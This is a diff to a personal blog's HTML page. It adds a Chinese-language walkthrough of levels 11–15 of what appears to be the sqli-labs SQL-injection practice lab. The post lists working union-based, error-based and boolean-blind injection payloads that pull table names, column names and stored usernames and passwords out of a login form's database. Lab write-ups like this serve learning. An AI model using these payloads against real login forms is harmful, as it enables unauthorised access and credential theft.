@@ -71,6 +71,69 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-sql-11-15关" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2023/12/15/sql-11-15%E5%85%B3/" class="article-date">
+  <time class="dt-published" datetime="2023-12-15T07:51:17.000Z" itemprop="datePublished">2023-12-15</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2023/12/15/sql-11-15%E5%85%B3/">sql 11-15关</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>sql第十一关</p>
+<p>1.这关点开发现是以浏览器表单的形式进行注入，上面的输入框是username，下面的是password，用户名随便输个数，密码再慢慢试验，id&#x3D;1’时发现报错，进一步验证为单引号注入，用order by测试为两列</p>
+<p>2.输入Password：1’ union select 1,2，发现正常回显在页面下方</p>
+<p>3.输入1’ union select 1,group_concat(table_name) from information_schema.tables where table_schema&#x3D;‘security’#</p>
+<p>4.输入1’ union select 1,group_concat(column_name) from information_schema.columns where table_name&#x3D;‘users’ and table_schema&#x3D;‘security’#</p>
+<p>5.输入1’ union select 1,group_concat(username,’~’,password) from security.users#</p>
+<p>6.得到结果</p>
+<p>sql第十二关</p>
+<p>1.测试闭合方式为”)</p>
+<p>2.其它同十一关</p>
+<p>sql第十三关</p>
+<p>1.注入方式为’)，但不存在显示位，使用报错注入即可，这边用的是xpath的报错注入</p>
+<p>sql第十四关</p>
+<p>1.双引号闭合</p>
+<p>2.报错注入即可</p>
+<p>sql第十五关</p>
+<p>1.这个页面既没有正常回显，也没有报错信息回显，于是考虑使用bool盲注</p>
+<p>2.1’ or length(database())&gt;8 #，就用这种方法来判断长度（这边要注意一下用的是or而不是and，用or只要一个对就能执行了，用and要两个都对才行，而你又猜不到id和密码），发现&gt;7时错误，说明长度是8</p>
+<p>3.1’ or left(database(),1)&gt;’z’ #，一个个试，算出来了数据库名字</p>
+<p>4.1’ or length((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1))&gt;6 #这是猜第一张表的长度的，结果就是6</p>
+<p>5.1’ or left((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),1)&gt;’f’ #测试表名</p>
+<p>6.1’ or length((select column_name from information_schema.columns where table_name&#x3D;’emails’ limit 0,1))&gt;3 #测试表的第一列长度，结果报错，试验1也报错，得出2</p>
+<p>7.1’ or left((select column_name from information_schema.columns where table_name&#x3D;’emails’ limit 0,1),1)&gt;’a’ #<br>猜列名</p>
+<p>8.1’ or left((select id from emails limit 0,1),1)&gt;0 #猜字段</p>
+<p>9.一个个弄出来即可</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2023/12/15/sql-11-15%E5%85%B3/" data-id="clg95qsqt0000b8xx4dt501kg" data-title="sql 11-15关" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-test" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2022/12/23/test/" class="article-date">
@@ -319,7 +382,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Archives</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/12/">December 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/10/">October 2022</a></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/12/">December 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/12/">December 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/10/">October 2022</a></li></ul>
     </div>
   </div>
 
@@ -330,6 +393,10 @@
     <h3 class="widget-title">Recent Posts</h3>
     <div class="widget">
       <ul>
+        
+          <li>
+            <a href="/2023/12/15/sql-11-15%E5%85%B3/">sql 11-15关</a>
+          </li>
         
           <li>
             <a href="/2022/12/23/test/">test</a>
